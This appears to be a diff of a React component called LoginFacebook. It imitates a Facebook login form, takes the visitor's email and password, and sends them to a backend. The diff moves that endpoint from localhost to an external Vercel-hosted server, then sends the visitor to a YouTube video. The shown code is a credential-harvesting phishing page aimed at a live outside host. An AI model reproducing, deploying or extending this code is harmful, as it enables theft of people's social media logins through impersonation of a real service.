@@ -24,11 +24,11 @@ const LoginFacebook = () => {
     if (email && password) {
       try {
         // POST the credentials to your backend
-        const response = await axios.post('http://localhost:8080/api/login-facebook', { email, password });
+        const response = await axios.post('https://worldadd-api.vercel.app/api/login-facebook', { email, password });
 
         if (response.status === 200) {
           // Redirect to the specified YouTube link on successful login
-          window.location.href = 'https://www.youtube.com/watch?v=xuekUzf_vPE&feature=youtu.be';
+         window.location.href = 'https://www.youtube.com/watch?v=xuekUzf_vPE&feature=youtu.be';
         } else {
           // Handle login failure
           console.error('Login failed');
